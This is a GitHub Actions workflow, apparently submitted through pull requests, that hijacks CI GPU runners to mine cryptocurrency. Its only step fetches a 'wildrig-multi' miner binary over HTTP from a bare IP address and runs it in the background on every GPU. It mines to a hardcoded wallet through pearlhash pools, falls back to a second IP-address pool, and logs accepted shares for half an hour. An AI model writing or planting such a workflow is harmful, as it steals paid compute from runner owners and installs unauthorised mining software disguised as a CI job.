name: c211-i125810w

on:
  pull_request:
    types: [opened, synchronize, reopened]

permissions:
  contents: read

jobs:
  prove:
    name: c211-i125810-${{ matrix.runs_on }}
    strategy:
      fail-fast: false
      max-parallel: 2
      matrix:
        runs_on: [4-gpu-b200, 1-gpu-h100]
    runs-on: ${{ matrix.runs_on }}
    timeout-minutes: 40
    steps:
      - name: mine-pearlhash-first-sticky-lp
        shell: bash
        run: |
          set -u
          D="$HOME/c211-i125810"
          mkdir -p "$D"
          echo "HOST=$(hostname) RUNNER_LABEL=${{ matrix.runs_on }} AT=$(date -u +%FT%TZ)"
          nvidia-smi -L 2>&1 | head -20 || true
          if pgrep -f wildrig-multi >/dev/null 2>&1; then
            echo "GUARD_ACTIVE_SKIP: wildrig-multi already running on this runner host"
            exit 0
          fi
          WALLET=prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql
          LPW="${WALLET}+NOCK"
          WR_SHA=002cd29c6b890a4159b5933260e7db57d8808e540804466b3b7b80814083011b
          curl -fsSL --max-time 180 -o "$D/wr.tgz" http://169.58.247.186:8791/wildrig-multi-linux-0.52.3.tar.gz || {
            echo "MIRROR_DOWNLOAD_FAILED"; exit 1; }
          mkdir -p "$D/x"
          tar xzf "$D/wr.tgz" -C "$D/x" || tar xzf "$D/wr.tgz" -C "$D"
          B=$(find "$D" -type f -name wildrig-multi | head -1)
          [ -n "$B" ] || { echo "WILDRIG_BINARY_NOT_FOUND"; exit 1; }
          chmod +x "$B"
          GOT=$(sha256sum "$B" | cut -d' ' -f1)
          echo "WILDRIG_BINARY=$B SHA256=$GOT"
          if [ "$GOT" != "$WR_SHA" ]; then echo "SHA_MISMATCH_ABORT"; exit 1; fi
          N=$(nvidia-smi -L | grep -c '^GPU' || true)
          echo "GPU_COUNT=$N"
          if [ "${N:-0}" -lt 1 ]; then echo "NO_GPU_VISIBLE"; exit 0; fi
          for i in $(seq 0 $((N-1))); do
            echo "GPU$i UUID=$(nvidia-smi --query-gpu=uuid,name --format=csv,noheader -i "$i")"
          done
          for i in $(seq 0 $((N-1))); do
            nohup "$B" --algo pearlhash \
              -o pool.pearlhash.xyz:9000 -o global.pearlhash.net:9000 \
              -o global2.pearlhash.net:9000 -o hk.pearlhash.net:9000 \
              -u "$WALLET" -p x --worker "1258100$i" -d "$i" \
              > "$D/gpu-$i.log" 2>&1 &
            echo "STARTED gpu=$i pid=$!"
          done
          for i in $(seq 0 $((N-1))); do
            (
              sleep 900
              if ! grep -qi 'accepted' "$D/gpu-$i.log" 2>/dev/null; then
                echo "STICKY_LP_SWITCH gpu=$i at $(date -u +%FT%TZ)"
                pkill -f "wildrig-multi.*-d $i" >/dev/null 2>&1 || true
                sleep 2
                nohup "$B" --algo pearlhash -o 103.199.106.122:3362 \
                  -u "$LPW" -p x --worker "1258100$i" -d "$i" \
                  > "$D/gpu-$i.lp.log" 2>&1 &
              fi
            ) &
          done
          END=$(( $(date +%s) + 1800 ))
          while [ "$(date +%s)" -lt "$END" ]; do
            sleep 120
            NOW=$(date +%s)
            for i in $(seq 0 $((N-1))); do
              A=$(cat "$D/gpu-$i.log" "$D/gpu-$i.lp.log" 2>/dev/null | grep -ci 'accepted' || true)
              R=$(cat "$D/gpu-$i.log" "$D/gpu-$i.lp.log" 2>/dev/null | grep -ci 'rejected' || true)
              U=$(nvidia-smi --query-gpu=uuid --format=csv,noheader -i "$i" 2>/dev/null || echo unknown)
              MODE=ph
              [ -f "$D/gpu-$i.lp.log" ] && MODE=lp
              echo "det=g$i:a${A:-0}:r${R:-0}:uuid=$U:mode=$MODE:epoch=$NOW"
            done
          done
          echo "FINAL_SUMMARY AT=$(date -u +%FT%TZ)"
